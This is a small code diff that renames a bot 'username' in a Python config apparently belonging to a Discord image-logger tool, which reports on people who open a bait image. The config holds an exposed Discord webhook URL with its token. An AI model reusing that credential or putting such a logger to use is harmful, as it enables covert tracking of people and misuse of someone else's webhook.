@@ -6,7 +6,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1383125978695598344/IiV4_ZnApdIN4weH1iAY3NEEEhGXRyj_YWYA_0qihT9lFwktXbdTHx8sptpzw6x-e70S",
     "image": "https://img.freepik.com/free-photo/anime-girl-cherry-blossoms-full-moon_23-2152016699.jpg?semt=ais_hybrid&w=740&q=80",
     "imageArgument": True,
-    "username": "TrackOrd",
+    "username": "Drako",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
     "color": 0x1C2526,  # Very dark grey
 
